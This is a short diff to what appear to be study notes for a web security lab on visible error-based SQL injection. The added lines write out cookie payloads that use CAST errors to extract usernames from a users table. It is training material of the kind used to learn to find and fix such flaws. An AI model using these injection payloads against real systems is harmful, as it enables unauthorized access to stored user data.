@@ -291,3 +291,11 @@ Lab13: Visible error-based SQL injection
       TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- : error saying that an AND condition must be a boolean expression.
 
       TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- : Confirm that you no longer receive an error. This suggests that this is a valid query again. 
+
+
+   -Use SELECT statement so that it retrieves usernames from the database: 
+
+      TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)-- :now appears to be truncated due to a character limit
+
+      - Delete the original value of the TrackingId cookie 
+         TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
